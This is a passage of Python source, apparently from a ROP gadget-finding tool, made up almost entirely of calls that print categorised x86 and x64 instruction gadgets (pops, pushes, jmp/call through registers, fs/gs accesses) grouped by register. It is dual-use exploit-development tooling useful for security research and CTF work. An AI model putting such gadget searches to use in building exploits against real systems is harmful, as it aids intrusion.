	printRetDict(lea, "edx", fg.leaEDX)
	printRetDict(lea, "edi", fg.leaEDI)
	printRetDict(lea, "esi", fg.leaESI)

	printRetDict(xchg, "esp", fg.xchgESP)
	printRetDict(xchg, "ebp", fg.xchgEBP)
	printRetDict(xchg, "eax", fg.xchgEAX)
	printRetDict(xchg, "ebx", fg.xchgEBX)
	printRetDict(xchg, "ecx", fg.xchgECX)
	printRetDict(xchg, "edx", fg.xchgEDX)
	printRetDict(xchg, "edi", fg.xchgEDI)
	printRetDict(xchg, "esi", fg.xchgESI)

	printRetDict(neg, "esp", fg.negESP)
	printRetDict(neg, "ebp", fg.negEBP)
	printRetDict(neg, "eax", fg.negEAX)
	printRetDict(neg, "ebx", fg.negEBX)
	printRetDict(neg, "ecx", fg.negECX)
	printRetDict(neg, "edx", fg.negEDX)
	printRetDict(neg, "edi", fg.negEDI)
	printRetDict(neg, "esi", fg.negESI)

	printRetDict(xor, "esp", fg.xorESP)
	printRetDict(xor, "ebp", fg.xorEBP)
	printRetDict(xor, "eax", fg.xorEAX)
	printRetDict(xor, "ebx", fg.xorEBX)
	printRetDict(xor, "ecx", fg.xorECX)
	printRetDict(xor, "edx", fg.xorEDX)
	printRetDict(xor, "edi", fg.xorEDI)
	printRetDict(xor, "esi", fg.xorESI)

	printRetDict(xorZero, "esp", fg.xorZeroESP)
	printRetDict(xorZero, "ebp", fg.xorZeroEBP)
	printRetDict(xorZero, "eax", fg.xorZeroEAX)
	printRetDict(xorZero, "ebx", fg.xorZeroEBX)
	printRetDict(xorZero, "ecx", fg.xorZeroECX)
	printRetDict(xorZero, "edx", fg.xorZeroEDX)
	printRetDict(xorZero, "edi", fg.xorZeroEDI)
	printRetDict(xorZero, "esi", fg.xorZeroESI)


	printRetDict(xorDword, "esp", fg.xorDwordESP)
	printRetDict(xorDword, "ebp", fg.xorDwordEBP)
	printRetDict(xorDword, "eax", fg.xorDwordEAX)
	printRetDict(xorDword, "ebx", fg.xorDwordEBX)
	printRetDict(xorDword, "ecx", fg.xorDwordECX)
	printRetDict(xorDword, "edx", fg.xorDwordEDX)
	printRetDict(xorDword, "edi", fg.xorDwordEDI)
	printRetDict(xorDword, "esi", fg.xorDwordESI)


	printRetDict("popal", "", fg.popal)
	printRetDict("pushad", "", fg.pushad)

	printRetDict(mov, "esp", fg.movESP)
	printRetDict(mov, "ebp", fg.movEBP)
	printRetDict(mov, "eax", fg.movEAX)
	printRetDict(mov, "ebx", fg.movEBX)
	printRetDict(mov, "ecx", fg.movECX)
	printRetDict(mov, "edx", fg.movEDX)
	printRetDict(mov, "edi", fg.movEDI)
	printRetDict(mov, "esi", fg.movESI)

	printRetDict(movConstant, "esp", fg.movConstantESP)
	printRetDict(movConstant, "ebp", fg.movConstantEBP)
	printRetDict(movConstant, "eax", fg.movConstantEAX)
	printRetDict(movConstant, "ebx", fg.movConstantEBX)
	printRetDict(movConstant, "ecx", fg.movConstantECX)
	printRetDict(movConstant, "edx", fg.movConstantEDX)
	printRetDict(movConstant, "edi", fg.movConstantEDI)
	printRetDict(movConstant, "esi", fg.movConstantESI)



	printRetDict(movDword, "esp", fg.movDwordESP)
	printRetDict(movDword, "ebp", fg.movDwordEBP)
	printRetDict(movDword, "eax", fg.movDwordEAX)
	printRetDict(movDword, "ebx", fg.movDwordEBX)
	printRetDict(movDword, "ecx", fg.movDwordECX)
	printRetDict(movDword, "edx", fg.movDwordEDX)
	printRetDict(movDword, "edi", fg.movDwordEDI)
	printRetDict(movDword, "esi", fg.movDwordESI)



	printRetDict("movDword2", "esp", fg.movDword2ESP)
	printRetDict("movDword2", "ebp", fg.movDword2EBP)
	printRetDict("movDword2", "eax", fg.movDword2EAX)
	printRetDict("movDword2", "ebx", fg.movDword2EBX)
	printRetDict("movDword2", "ecx", fg.movDword2ECX)
	printRetDict("movDword2", "edx", fg.movDword2EDX)
	printRetDict("movDword2", "edi", fg.movDword2EDI)
	printRetDict("movDword2", "esi", fg.movDword2ESI)

	printRetDict("shr", "", fg.shr)
	printRetDict("shl", "", fg.shl)

	printRetDict("shr dword", "", fg.shrDword)
	printRetDict("shl dword", "", fg.shlDword)

	printRetDict("rcr", "", fg.rcr)
	printRetDict("rcr dword", "", fg.rcrDword)

	printRetDict("rcl", "", fg.rcl)
	printRetDict("rcl dword", "", fg.rclDword)
	# dp ("\n\n\n\n")
	# dp ("dict start")
	# dp (len(fg.pops))

	# ans=[]
	# for each in fg.pops:
	# 	ans.append(each)
	# dp (ans)

	printRetDict("pushDword", "esp", fg.pushDwordESP)
	printRetDict("pushDword", "ebp", fg.pushDwordEBP)
	printRetDict("pushDword", "eax", fg.pushDwordEAX)
	printRetDict("pushDword", "ebx", fg.pushDwordEBX)
	printRetDict("pushDword", "ecx", fg.pushDwordECX)
	printRetDict("pushDword", "edx", fg.pushDwordEDX)
	printRetDict("pushDword", "edi", fg.pushDwordEDI)
	printRetDict("pushDword", "esi", fg.pushDwordESI)
	printRetDict("pushDword", "other", fg.pushDwordOther)



	printRetDict("popDword", "esp", fg.popDwordESP)
	printRetDict("popDword", "ebp", fg.popDwordEBP)
	printRetDict("popDword", "eax", fg.popDwordEAX)
	printRetDict("popDword", "ebx", fg.popDwordEBX)
	printRetDict("popDword", "ecx", fg.popDwordECX)
	printRetDict("popDword", "edx", fg.popDwordEDX)
	printRetDict("popDword", "edi", fg.popDwordEDI)
	printRetDict("popDword", "esi", fg.popDwordESI)
	printRetDict("popDword", "other", fg.popDwordOther)
	printRetDict("unusual", "unusual", fg.unusual)




	printRetDict("and", "esp", fg.andInstESP)
	printRetDict("and", "ebp", fg.andInstEBP)
	printRetDict("and", "eax", fg.andInstEAX)
	printRetDict("and", "ebx", fg.andInstEBX)
	printRetDict("and", "ecx", fg.andInstECX)
	printRetDict("and", "edx", fg.andInstEDX)
	printRetDict("and", "edi", fg.andInstEDI)
	printRetDict("and", "esi", fg.andInstESI)



	printRetDict("not", "esp", fg.notInstESP)
	printRetDict("not", "ebp", fg.notInstEBP)
	printRetDict("not", "eax", fg.notInstEAX)
	printRetDict("not", "ebx", fg.notInstEBX)
	printRetDict("not", "ecx", fg.notInstECX)
	printRetDict("not", "edx", fg.notInstEDX)
	printRetDict("not", "edi", fg.notInstEDI)
	printRetDict("not", "esi", fg.notInstESI)

	printRetDict("fs special", "fs", fg.fs)
	printRetDict("pushDword", "fs", fg.pushDwordFS)

	printRetDict("fs special", "fs", fg.fsSpecial)

	printRetDict("fs xor", "fs", fg.xorFS)
	printRetDict("fs add", "fs", fg.addFS)
	printRetDict("fs sub", "fs", fg.subFS)
	printRetDict("fs sub", "eax", fg.subFSEAX)
	printRetDict("fs sub", "ebx", fg.subFSEBX)
	printRetDict("fs sub", "ecx", fg.subFSECX)
	printRetDict("fs sub", "edx", fg.subFSEDX)
	printRetDict("fs sub", "esi", fg.subFSESI)
	printRetDict("fs sub", "edi", fg.subFSEDI)
	printRetDict("fs sub", "ebp", fg.subFSEBP)


	printRetDict("fs xchg", "fs", fg.xchgFS)
	printRetDict("fs mov", "fs", fg.movFS)

	printRetDict("hg push", "esp", fg.hgPushESP)
	printRetDict("hg push", "ebp", fg.hgPushEBP)
	printRetDict("hg push", "eax", fg.hgPushEAX)
	printRetDict("hg push", "ebx", fg.hgPushEBX)
	printRetDict("hg push", "ecx", fg.hgPushECX)
	printRetDict("hg push", "edx", fg.hgPushEDX)
	printRetDict("hg push", "edi", fg.hgPushEDI)
	printRetDict("hg push", "esi", fg.hgPushESI)
	printRetDict("hg push", "constant", fg.hgPushConstant)
	printRetDict("hg push", "other", fg.hgPushOther)

	printRetDict("hg pushDword", "esp", fg.hgPushDwordESP)
	printRetDict("hg pushDword", "ebp", fg.hgPushDwordEBP)
	printRetDict("hg pushDword", "eax", fg.hgPushDwordEAX)
	printRetDict("hg pushDword", "ebx", fg.hgPushDwordEBX)
	printRetDict("hg pushDword", "ecx", fg.hgPushDwordECX)
	printRetDict("hg pushDword", "edx", fg.hgPushDwordEDX)
	printRetDict("hg pushDword", "edi", fg.hgPushDwordEDI)
	printRetDict("hg pushDword", "esi", fg.hgPushDwordESI)
	printRetDict("hg pushDword", "other", fg.hgPushDwordOther)
	printRetDict("ret", "", fg.ret)
	printRetDict("retC2", "", fg.retC2)
	
	

	# disMini(myDict[t].g.raw, myDict[t].g.offset),
	# dp ("\t\rc candidate", hex(addy), disMini(myDict[addy].raw, myDict[addy].offset))

	# myDict=fg.retC2

	printRetDict("jmpEAX","",fg.jmpEAX)
	printRetDict("jmpEBX","",fg.jmpEBX)
	printRetDict("jmpECX","",fg.jmpECX)
	printRetDict("jmpEDX","",fg.jmpEDX)
	printRetDict("jmpESI","",fg.jmpESI)
	printRetDict("jmpEDI","",fg.jmpEDI)
	printRetDict("jmpEBP","",fg.jmpEBP)
	printRetDict("jmpESP","",fg.jmpESP)
	printRetDict("callEAX","",fg.callEAX)
	printRetDict("callEBX","",fg.callEBX)
	printRetDict("callECX","",fg.callECX)
	printRetDict("callEDX","",fg.callEDX)
	printRetDict("callESI","",fg.callESI)
	printRetDict("callEDI","",fg.callEDI)
	printRetDict("callEBP","",fg.callEBP)
	printRetDict("callESP","",fg.callESP)
	printRetDict("jmpDwordEAX","",fg.jmpDwordEAX)
	printRetDict("jmpDwordEBX","",fg.jmpDwordEBX)
	printRetDict("jmpDwordECX","",fg.jmpDwordECX)
	printRetDict("jmpDwordEDX","",fg.jmpDwordEDX)
	printRetDict("jmpDwordESI","",fg.jmpDwordESI)
	printRetDict("jmpDwordEDI","",fg.jmpDwordEDI)
	printRetDict("jmpDwordEBP","",fg.jmpDwordEBP)
	printRetDict("jmpDwordESP","",fg.jmpDwordESP)
	printRetDict("callDwordEAX","",fg.callDwordEAX)
	printRetDict("callDwordEBX","",fg.callDwordEBX)
	printRetDict("callDwordECX","",fg.callDwordECX)
	printRetDict("callDwordEDX","",fg.callDwordEDX)
	printRetDict("callDwordESI","",fg.callDwordESI)
	printRetDict("callDwordEDI","",fg.callDwordEDI)
	printRetDict("callDwordEBP","",fg.callDwordEBP)
	printRetDict("callDwordESP","",fg.callDwordESP)
	print ("size ret", len(fg.ret))

def printOutputs64():
	printRetDict('jmpRSI','',fg.jmpRSI,64)
	printRetDict('jmpRBP','',fg.jmpRBP,64)
	printRetDict('jmpRDI','',fg.jmpRDI,64)
	printRetDict('jmpRAX','',fg.jmpRAX,64)
	printRetDict('jmpRBX','',fg.jmpRBX,64)
	printRetDict('jmpRSP','',fg.jmpRSP,64)
	printRetDict('jmpRCX','',fg.jmpRCX,64)
	printRetDict('jmpRDX','',fg.jmpRDX,64)
	printRetDict('jmpR8','',fg.jmpR8,64)
	printRetDict('jmpR9','',fg.jmpR9,64)
	printRetDict('jmpR10','',fg.jmpR10,64)
	printRetDict('jmpR11','',fg.jmpR11,64)
	printRetDict('jmpR12','',fg.jmpR12,64)
	printRetDict('jmpR13','',fg.jmpR13,64)
	printRetDict('jmpR14','',fg.jmpR14,64)
	printRetDict('jmpR15','',fg.jmpR15,64)
	printRetDict('jmpQwordRBP','',fg.jmpQwordRBP,64)
	printRetDict('jmpQwordOffsetRBP','',fg.jmpQwordOffsetRBP,64)
	printRetDict('jmpQwordRSP','',fg.jmpQwordRSP,64)
	printRetDict('jmpQwordOffsetRSP','',fg.jmpQwordOffsetRSP,64)
	printRetDict('jmpQwordRDI','',fg.jmpQwordRDI,64)
	printRetDict('jmpQwordOffsetRDI','',fg.jmpQwordOffsetRDI,64)
	printRetDict('jmpQwordRSI','',fg.jmpQwordRSI,64)
	printRetDict('jmpQwordOffsetRSI','',fg.jmpQwordOffsetRSI,64)
	printRetDict('jmpQwordRAX','',fg.jmpQwordRAX,64)
	printRetDict('jmpQwordOffsetRAX','',fg.jmpQwordOffsetRAX,64)
	printRetDict('jmpQwordRBX','',fg.jmpQwordRBX,64)
	printRetDict('jmpQwordOffsetRBX','',fg.jmpQwordOffsetRBX,64)
	printRetDict('jmpQwordRCX','',fg.jmpQwordRCX,64)
	printRetDict('jmpQwordOffsetRCX','',fg.jmpQwordOffsetRCX,64)
	printRetDict('jmpQwordRDX','',fg.jmpQwordRDX,64)
	printRetDict('jmpQwordOffsetRDX','',fg.jmpQwordOffsetRDX,64)
	printRetDict('jmpQwordR8','',fg.jmpQwordR8,64)
	printRetDict('jmpQwordOffsetR8','',fg.jmpQwordOffsetR8,64)
	printRetDict('jmpQwordR9','',fg.jmpQwordR9,64)
	printRetDict('jmpQwordOffsetR9','',fg.jmpQwordOffsetR9,64)
	printRetDict('jmpQwordR10','',fg.jmpQwordR10,64)
	printRetDict('jmpQwordOffsetR10','',fg.jmpQwordOffsetR10,64)
	printRetDict('jmpQwordR11','',fg.jmpQwordR11,64)
	printRetDict('jmpQwordOffsetR11','',fg.jmpQwordOffsetR11,64)
	printRetDict('jmpQwordR12','',fg.jmpQwordR12,64)
	printRetDict('jmpQwordOffsetR12','',fg.jmpQwordOffsetR12,64)
	printRetDict('jmpQwordR13','',fg.jmpQwordR13,64)
	printRetDict('jmpQwordOffsetR13','',fg.jmpQwordOffsetR13,64)
	printRetDict('jmpQwordR14','',fg.jmpQwordR14,64)
	printRetDict('jmpQwordOffsetR14','',fg.jmpQwordOffsetR14,64)
	printRetDict('jmpQwordR15','',fg.jmpQwordR15,64)
	printRetDict('jmpQwordOffsetR15','',fg.jmpQwordOffsetR15,64)
	printRetDict('callRSI','',fg.callRSI,64)
	printRetDict('callRBP','',fg.callRBP,64)
	printRetDict('callRDI','',fg.callRDI,64)
	printRetDict('callRAX','',fg.callRAX,64)
	printRetDict('callRBX','',fg.callRBX,64)
	printRetDict('callRSP','',fg.callRSP,64)
	printRetDict('callRCX','',fg.callRCX,64)
	printRetDict('callRDX','',fg.callRDX,64)
	printRetDict('callR8','',fg.callR8,64)
	printRetDict('callR9','',fg.callR9,64)
	printRetDict('callR10','',fg.callR10,64)
	printRetDict('callR11','',fg.callR11,64)
	printRetDict('callR12','',fg.callR12,64)
	printRetDict('callR13','',fg.callR13,64)
	printRetDict('callR14','',fg.callR14,64)
	printRetDict('callR15','',fg.callR15,64)
	printRetDict('callQwordRBP','',fg.callQwordRBP,64)
	printRetDict('callQwordOffsetRBP','',fg.callQwordOffsetRBP,64)
	printRetDict('callQwordRSP','',fg.callQwordRSP,64)
	printRetDict('callQwordOffsetRSP','',fg.callQwordOffsetRSP,64)
	printRetDict('callQwordRDI','',fg.callQwordRDI,64)
	printRetDict('callQwordOffsetRDI','',fg.callQwordOffsetRDI,64)
	printRetDict('callQwordRSI','',fg.callQwordRSI,64)
	printRetDict('callQwordOffsetRSI','',fg.callQwordOffsetRSI,64)
	printRetDict('callQwordRAX','',fg.callQwordRAX,64)
	printRetDict('callQwordOffsetRAX','',fg.callQwordOffsetRAX,64)
	printRetDict('callQwordRBX','',fg.callQwordRBX,64)
	printRetDict('callQwordOffsetRBX','',fg.callQwordOffsetRBX,64)
	printRetDict('callQwordRCX','',fg.callQwordRCX,64)
	printRetDict('callQwordOffsetRCX','',fg.callQwordOffsetRCX,64)
	printRetDict('callQwordRDX','',fg.callQwordRDX,64)
	printRetDict('callQwordOffsetRDX','',fg.callQwordOffsetRDX,64)
	printRetDict('callQwordR8','',fg.callQwordR8,64)
	printRetDict('callQwordOffsetR8','',fg.callQwordOffsetR8,64)
	printRetDict('callQwordR9','',fg.callQwordR9,64)
	printRetDict('callQwordOffsetR9','',fg.callQwordOffsetR9,64)
	printRetDict('callQwordR10','',fg.callQwordR10,64)
	printRetDict('callQwordOffsetR10','',fg.callQwordOffsetR10,64)
	printRetDict('callQwordR11','',fg.callQwordR11,64)
	printRetDict('callQwordOffsetR11','',fg.callQwordOffsetR11,64)
	printRetDict('callQwordR12','',fg.callQwordR12,64)
	printRetDict('callQwordOffsetR12','',fg.callQwordOffsetR12,64)
	printRetDict('callQwordR13','',fg.callQwordR13,64)
	printRetDict('callQwordOffsetR13','',fg.callQwordOffsetR13,64)
	printRetDict('callQwordR14','',fg.callQwordR14,64)
	printRetDict('callQwordOffsetR14','',fg.callQwordOffsetR14,64)
	printRetDict('callQwordR15','',fg.callQwordR15,64)
	printRetDict('callQwordOffsetR15','',fg.callQwordOffsetR15,64)
	printRetDict('retfSingle64','',fg.retfSingle64,64)
	printRetDict('pops64','',fg.pops64,64)
	printRetDict('popRSI','',fg.popRSI,64)
	printRetDict('popRBX','',fg.popRBX,64)
	printRetDict('popRCX','',fg.popRCX,64)
	printRetDict('popRAX','',fg.popRAX,64)
	printRetDict('popRDI','',fg.popRDI,64)
	printRetDict('popRBP','',fg.popRBP,64)
	printRetDict('popRSP','',fg.popRSP,64)
	printRetDict('popRDX','',fg.popRDX,64)
	printRetDict('popR8','',fg.popR8,64)
	printRetDict('popR9','',fg.popR9,64)
	printRetDict('popR10','',fg.popR10,64)
	printRetDict('popR11','',fg.popR11,64)
	printRetDict('popR12','',fg.popR12,64)
	printRetDict('popR13','',fg.popR13,64)
	printRetDict('popR14','',fg.popR14,64)
	printRetDict('popR15','',fg.popR15,64)
	printRetDict('popOther64','',fg.popOther64,64)
	printRetDict('popQword','',fg.popQword,64)
	printRetDict('popQwordRAX','',fg.popQwordRAX,64)
	printRetDict('popQwordRBX','',fg.popQwordRBX,64)
	printRetDict('popQwordRCX','',fg.popQwordRCX,64)
	printRetDict('popQwordRDX','',fg.popQwordRDX,64)
	printRetDict('popQwordRSI','',fg.popQwordRSI,64)
	printRetDict('popQwordRDI','',fg.popQwordRDI,64)
	printRetDict('popQwordRSP','',fg.popQwordRSP,64)
	printRetDict('popQwordRBP','',fg.popQwordRBP,64)
	printRetDict('popQwordR8','',fg.popQwordR8,64)
	printRetDict('popQwordR9','',fg.popQwordR9,64)
	printRetDict('popQwordR10','',fg.popQwordR10,64)
	printRetDict('popQwordR11','',fg.popQwordR11,64)
	printRetDict('popQwordR12','',fg.popQwordR12,64)
	printRetDict('popQwordR13','',fg.popQwordR13,64)
	printRetDict('popQwordR14','',fg.popQwordR14,64)
	printRetDict('popQwordR15','',fg.popQwordR15,64)
	printRetDict('popQwordOther','',fg.popQwordOther,64)
	printRetDict('hgPush64','',fg.hgPush64,64)
	printRetDict('hgPushRAX','',fg.hgPushRAX,64)
	printRetDict('hgPushRBX','',fg.hgPushRBX,64)
	printRetDict('hgPushRCX','',fg.hgPushRCX,64)
	printRetDict('hgPushRBP','',fg.hgPushRBP,64)
	printRetDict('hgPushRSP','',fg.hgPushRSP,64)
	printRetDict('hgPushRDX','',fg.hgPushRDX,64)
	printRetDict('hgPushRDI','',fg.hgPushRDI,64)
	printRetDict('hgPushRSI','',fg.hgPushRSI,64)
	printRetDict('hgPushConstant64','',fg.hgPushConstant64,64)
	printRetDict('hgPushR8','',fg.hgPushR8,64)
	printRetDict('hgPushR9','',fg.hgPushR9,64)
	printRetDict('hgPushR10','',fg.hgPushR10,64)
	printRetDict('hgPushR11','',fg.hgPushR11,64)
	printRetDict('hgPushR12','',fg.hgPushR12,64)
	printRetDict('hgPushR13','',fg.hgPushR13,64)
	printRetDict('hgPushR14','',fg.hgPushR14,64)
	printRetDict('hgPushR15','',fg.hgPushR15,64)
	printRetDict('hgPushOther64','',fg.hgPushOther64,64)
	printRetDict('hgPushQword','',fg.hgPushQword,64)
	printRetDict('hgPushQwordRAX','',fg.hgPushQwordRAX,64)
	printRetDict('hgPushQwordRBX','',fg.hgPushQwordRBX,64)
	printRetDict('hgPushQwordRCX','',fg.hgPushQwordRCX,64)
	printRetDict('hgPushQwordRDX','',fg.hgPushQwordRDX,64)
	printRetDict('hgPushQwordRSI','',fg.hgPushQwordRSI,64)
	printRetDict('hgPushQwordRDI','',fg.hgPushQwordRDI,64)
	printRetDict('hgPushQwordRSP','',fg.hgPushQwordRSP,64)
	printRetDict('hgPushQwordRBP','',fg.hgPushQwordRBP,64)
	printRetDict('hgPushQwordR8','',fg.hgPushQwordR8,64)
	printRetDict('hgPushQwordR9','',fg.hgPushQwordR9,64)
	printRetDict('hgPushQwordR10','',fg.hgPushQwordR10,64)
	printRetDict('hgPushQwordR11','',fg.hgPushQwordR11,64)
	printRetDict('hgPushQwordR12','',fg.hgPushQwordR12,64)
	printRetDict('hgPushQwordR13','',fg.hgPushQwordR13,64)
	printRetDict('hgPushQwordR14','',fg.hgPushQwordR14,64)
	printRetDict('hgPushQwordR15','',fg.hgPushQwordR15,64)
	printRetDict('hgPushQwordOther','',fg.hgPushQwordOther,64)
	printRetDict('ret64','',fg.ret64,64)
	printRetDict('retC264','',fg.retC264,64)
	printRetDict('push64','',fg.push64,64)
	printRetDict('pushRAX','',fg.pushRAX,64)
	printRetDict('pushRBX','',fg.pushRBX,64)
	printRetDict('pushRCX','',fg.pushRCX,64)
	printRetDict('pushRBP','',fg.pushRBP,64)
	printRetDict('pushRSP','',fg.pushRSP,64)
	printRetDict('pushRDX','',fg.pushRDX,64)
	printRetDict('pushRDI','',fg.pushRDI,64)
	printRetDict('pushRSI','',fg.pushRSI,64)
	printRetDict('pushR8','',fg.pushR8,64)
	printRetDict('pushR9','',fg.pushR9,64)
	printRetDict('pushR10','',fg.pushR10,64)
	printRetDict('pushR11','',fg.pushR11,64)
	printRetDict('pushR12','',fg.pushR12,64)
	printRetDict('pushR13','',fg.pushR13,64)
	printRetDict('pushR14','',fg.pushR14,64)
	printRetDict('pushR15','',fg.pushR15,64)
	printRetDict('pushConstant64','',fg.pushConstant64,64)
	printRetDict('pushOther64','',fg.pushOther64,64)
	printRetDict('pushQwordGS','',fg.pushQwordGS,64)
	printRetDict('pushQwordGSRAX','',fg.pushQwordGSRAX,64)
	printRetDict('pushQwordGSRBX','',fg.pushQwordGSRBX,64)
	printRetDict('pushQwordGSRCX','',fg.pushQwordGSRCX,64)
	printRetDict('pushQwordGSRDX','',fg.pushQwordGSRDX,64)
	printRetDict('pushQwordGSRDI','',fg.pushQwordGSRDI,64)
	printRetDict('pushQwordGSRSI','',fg.pushQwordGSRSI,64)
	printRetDict('pushQwordGSRBP','',fg.pushQwordGSRBP,64)
	printRetDict('pushQwordGSR8','',fg.pushQwordGSR8,64)
	printRetDict('pushQwordGSR9','',fg.pushQwordGSR9,64)
	printRetDict('pushQwordGSR10','',fg.pushQwordGSR10,64)
	printRetDict('pushQwordGSR11','',fg.pushQwordGSR11,64)
	printRetDict('pushQwordGSR12','',fg.pushQwordGSR12,64)
	printRetDict('pushQwordGSR13','',fg.pushQwordGSR13,64)
	printRetDict('pushQwordGSR14','',fg.pushQwordGSR14,64)
	printRetDict('pushQwordGSR15','',fg.pushQwordGSR15,64)
	printRetDict('pushQword64','',fg.pushQword64,64)
	printRetDict('pushQwordRAX','',fg.pushQwordRAX,64)
	printRetDict('pushQwordRBX','',fg.pushQwordRBX,64)
	printRetDict('pushQwordRCX','',fg.pushQwordRCX,64)
	printRetDict('pushQwordRDX','',fg.pushQwordRDX,64)
	printRetDict('pushQwordRSI','',fg.pushQwordRSI,64)
	printRetDict('pushQwordRDI','',fg.pushQwordRDI,64)
	printRetDict('pushQwordRSP','',fg.pushQwordRSP,64)
	printRetDict('pushQwordRBP','',fg.pushQwordRBP,64)
	printRetDict('pushQwordR8','',fg.pushQwordR8,64)
	printRetDict('pushQwordR9','',fg.pushQwordR9,64)
	printRetDict('pushQwordR10','',fg.pushQwordR10,64)
	printRetDict('pushQwordR11','',fg.pushQwordR11,64)
	printRetDict('pushQwordR12','',fg.pushQwordR12,64)
	printRetDict('pushQwordR13','',fg.pushQwordR13,64)
	printRetDict('pushQwordR14','',fg.pushQwordR14,64)
	printRetDict('pushQwordR15','',fg.pushQwordR15,64)
	printRetDict('pushQwordGS','',fg.pushQwordGS,64)
	printRetDict('pushQwordOther','',fg.pushQwordOther,64)
	printRetDict('inc64','',fg.inc64,64)
	printRetDict('incRSI','',fg.incRSI,64)
	printRetDict('incRBP','',fg.incRBP,64)
	printRetDict('incRDI','',fg.incRDI,64)
	printRetDict('incRAX','',fg.incRAX,64)
	printRetDict('incRBX','',fg.incRBX,64)
	printRetDict('incRSP','',fg.incRSP,64)
	printRetDict('incRCX','',fg.incRCX,64)
	printRetDict('incRDX','',fg.incRDX,64)
	printRetDict('incR8','',fg.incR8,64)
	printRetDict('incR9','',fg.incR9,64)
	printRetDict('incR10','',fg.incR10,64)
	printRetDict('incR11','',fg.incR11,64)
	printRetDict('incR12','',fg.incR12,64)
	printRetDict('incR13','',fg.incR13,64)
	printRetDict('incR14','',fg.incR14,64)
	printRetDict('incR15','',fg.incR15,64)
	printRetDict('dec64','',fg.dec64,64)
	printRetDict('decRSI','',fg.decRSI,64)
	printRetDict('decRBP','',fg.decRBP,64)
	printRetDict('decRDI','',fg.decRDI,64)
	printRetDict('decRAX','',fg.decRAX,64)
	printRetDict('decRBX','',fg.decRBX,64)
	printRetDict('decRSP','',fg.decRSP,64)
	printRetDict('decRCX','',fg.decRCX,64)
	printRetDict('decRDX','',fg.decRDX,64)
	printRetDict('decR8','',fg.decR8,64)
	printRetDict('decR9','',fg.decR9,64)
	printRetDict('decR10','',fg.decR10,64)
	printRetDict('decR11','',fg.decR11,64)
	printRetDict('decR12','',fg.decR12,64)
	printRetDict('decR13','',fg.decR13,64)
	printRetDict('decR14','',fg.decR14,64)
	printRetDict('decR15','',fg.decR15,64)
	printRetDict('add64','',fg.add64,64)
	printRetDict('addRAX','',fg.addRAX,64)
	printRetDict('addRBX','',fg.addRBX,64)
	printRetDict('addRCX','',fg.addRCX,64)
	printRetDict('addRSP','',fg.addRSP,64)
	printRetDict('addRSPVal','',fg.addRSPVal,64)
	printRetDict('addRBP','',fg.addRBP,64)
	printRetDict('addRDX','',fg.addRDX,64)
	printRetDict('addRDI','',fg.addRDI,64)
	printRetDict('addRSI','',fg.addRSI,64)
	printRetDict('addR8','',fg.addR8,64)
	printRetDict('addR9','',fg.addR9,64)
	printRetDict('addR10','',fg.addR10,64)
	printRetDict('addR11','',fg.addR11,64)
	printRetDict('addR12','',fg.addR12,64)
	printRetDict('addR13','',fg.addR13,64)
	printRetDict('addR14','',fg.addR14,64)
	printRetDict('addR15','',fg.addR15,64)
	printRetDict('addQwordRAX','',fg.addQwordRAX,64)
	printRetDict('addQwordRBX','',fg.addQwordRBX,64)
	printRetDict('addQwordRCX','',fg.addQwordRCX,64)
	printRetDict('addQwordRSP','',fg.addQwordRSP,64)
	printRetDict('addQwordRBP','',fg.addQwordRBP,64)
	printRetDict('addQwordRDX','',fg.addQwordRDX,64)
	printRetDict('addQwordRDI','',fg.addQwordRDI,64)
	printRetDict('addQwordRSI','',fg.addQwordRSI,64)
	printRetDict('addQwordR8','',fg.addQwordR8,64)
	printRetDict('addQwordR9','',fg.addQwordR9,64)
	printRetDict('addQwordR10','',fg.addQwordR10,64)
	printRetDict('addQwordR11','',fg.addQwordR11,64)
	printRetDict('addQwordR12','',fg.addQwordR12,64)
	printRetDict('addQwordR13','',fg.addQwordR13,64)
	printRetDict('addQwordR14','',fg.addQwordR14,64)
	printRetDict('addQwordR15','',fg.addQwordR15,64)
	printRetDict('addGS','',fg.addGS,64)
	printRetDict('sub64','',fg.sub64,64)
	printRetDict('subRAX','',fg.subRAX,64)
	printRetDict('subRBX','',fg.subRBX,64)
	printRetDict('subRCX','',fg.subRCX,64)
	printRetDict('subRDX','',fg.subRDX,64)
	printRetDict('subRSI','',fg.subRSI,64)
	printRetDict('subRDI','',fg.subRDI,64)
	printRetDict('subRSP','',fg.subRSP,64)
	printRetDict('subRBP','',fg.subRBP,64)
	printRetDict('subR8','',fg.subR8,64)
	printRetDict('subR9','',fg.subR9,64)
	printRetDict('subR10','',fg.subR10,64)
	printRetDict('subR11','',fg.subR11,64)
	printRetDict('subR12','',fg.subR12,64)
	printRetDict('subR13','',fg.subR13,64)
	printRetDict('subR14','',fg.subR14,64)
	printRetDict('subR15','',fg.subR15,64)
	printRetDict('subQwordRAX','',fg.subQwordRAX,64)
	printRetDict('subQwordRBX','',fg.subQwordRBX,64)
	printRetDict('subQwordRCX','',fg.subQwordRCX,64)
	printRetDict('subQwordRDX','',fg.subQwordRDX,64)
	printRetDict('subQwordRSI','',fg.subQwordRSI,64)
	printRetDict('subQwordRDI','',fg.subQwordRDI,64)
	printRetDict('subQwordRSP','',fg.subQwordRSP,64)
	printRetDict('subQwordRBP','',fg.subQwordRBP,64)
	printRetDict('subQwordR8','',fg.subQwordR8,64)
	printRetDict('subQwordR9','',fg.subQwordR9,64)
	printRetDict('subQwordR10','',fg.subQwordR10,64)
	printRetDict('subQwordR11','',fg.subQwordR11,64)
	printRetDict('subQwordR12','',fg.subQwordR12,64)
	printRetDict('subQwordR13','',fg.subQwordR13,64)
	printRetDict('subQwordR14','',fg.subQwordR14,64)
	printRetDict('subQwordR15','',fg.subQwordR15,64)
	printRetDict('subGS','',fg.subGS,64)
	printRetDict('mul','',fg.mul,64)
	printRetDict('mulRAX','',fg.mulRAX,64)
	printRetDict('mulRDX','',fg.mulRDX,64)
	printRetDict('mulRAX','',fg.mulRAX,64)
	printRetDict('mulRBX','',fg.mulRBX,64)
	printRetDict('mulRCX','',fg.mulRCX,64)
	printRetDict('mulRDX','',fg.mulRDX,64)
	printRetDict('mulRSI','',fg.mulRSI,64)
	printRetDict('mulRDI','',fg.mulRDI,64)
	printRetDict('mulRSP','',fg.mulRSP,64)
	printRetDict('mulRBP','',fg.mulRBP,64)
	printRetDict('mulR8','',fg.mulR8,64)
	printRetDict('mulR9','',fg.mulR9,64)
	printRetDict('mulR10','',fg.mulR10,64)
	printRetDict('mulR11','',fg.mulR11,64)
	printRetDict('mulR12','',fg.mulR12,64)
	printRetDict('mulR13','',fg.mulR13,64)
	printRetDict('mulR14','',fg.mulR14,64)
	printRetDict('mulR15','',fg.mulR15,64)
	printRetDict('div','',fg.div,64)
